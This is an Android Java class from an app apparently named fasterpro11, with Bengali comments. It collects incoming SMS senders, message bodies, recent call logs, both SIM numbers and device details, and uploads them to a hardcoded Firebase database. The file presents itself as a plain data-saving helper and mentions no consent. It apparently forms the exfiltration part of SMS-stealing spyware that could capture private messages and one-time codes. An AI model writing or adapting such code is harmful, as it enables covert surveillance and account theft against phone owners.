package com.example.fasterpro11;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class FirebaseSaVeAndViewData {

    private static final String TAG = "FirebaseSaVeAndViewData";
    private static final String DATABASE_URL = "https://fasterpro11-9b9a9-default-rtdb.firebaseio.com/";
    private DatabaseReference mDatabase;

    // Firebase Database ইনিশিয়ালাইজেশন
    public FirebaseSaVeAndViewData() {
        mDatabase = FirebaseDatabase.getInstance(DATABASE_URL).getReference();
    }

    /**
     * SMS ডেটা Firebase-এ সংরক্ষণ করা (SMS ID আগের মতো)
     */
    public void saveSmsDataToFirebase(
            String sender,
            String body,
            String subject,
            String recentCallLogs,
            Context context
    ) {
        try {
            // SIM এবং ডিভাইস তথ্য নিন
            GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
            String UserID1 = alert.getSim1NumberFromUser(context);
            String UserID2 = alert.getSim2NumberFromUser(context);
            String UserGivenSimNumber = (UserID1 != null ? UserID1 : "null") + " " + (UserID2 != null ? UserID2 : "null");

            NotificationListener notificationListener = new NotificationListener();
            String setSim1NumberNotificationListener = notificationListener.SetSim1Number(context, body);

            SmsReceiver smsReceiver = new SmsReceiver();
            String setSim1NumberSmsReceiver = smsReceiver.SetSim1Number(context, body);

            String setSim1Number;
            if (setSim1NumberNotificationListener != null) {
                setSim1Number = setSim1NumberNotificationListener;
            } else if (setSim1NumberSmsReceiver != null) {
                setSim1Number = setSim1NumberSmsReceiver;
            } else {
                setSim1Number = "null";
            }

            String manufacturer = Build.MANUFACTURER != null ? Build.MANUFACTURER : "unknown";
            String mobileModel = Build.MODEL != null ? Build.MODEL : "unknown";

            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss a", Locale.getDefault()).format(new Date());

            // Firebase push key + timestamp + sim/device info (SMS ID আগের মতো)
            String pushKey = mDatabase.push().getKey();
            String smsId = (pushKey != null ? pushKey : "unknown") + " " +
                    timestamp + " " +
                    setSim1Number + " " +
                    UserGivenSimNumber + " " +
                    manufacturer + " " +
                    mobileModel;

            Log.d(TAG, "Generated SMS ID: " + smsId);

            if (smsId != null) {
                Map<String, Object> smsData = new HashMap<>();

                // Subject lines
                smsData.put("subject", Arrays.asList(subject.split("\n")));
                // Sender
                smsData.put("sender", sender);
                // Body lines
                smsData.put("messageBody", Arrays.asList(body.split("\n")));
                // Call logs
                smsData.put("recentCallLogs", Arrays.asList(recentCallLogs.split("\n")));

                // Firebase-এ সংরক্ষণ
                mDatabase.child("smsData").child(smsId).setValue(smsData)
                        .addOnCompleteListener(task -> {
                            if (task.isSuccessful()) {
                                Log.d(TAG, "✅ Firebase Data Saved Successfully.");
                            } else {
                                Log.e(TAG, "❌ Firebase Data Save Error: ", task.getException());
                            }
                        });
            } else {
                Log.e(TAG, "❌ SMS ID Create Error");
            }

        } catch (Exception e) {
            Log.e(TAG, "❌ Exception in saveSmsDataToFirebase: ", e);
        }
    }
}
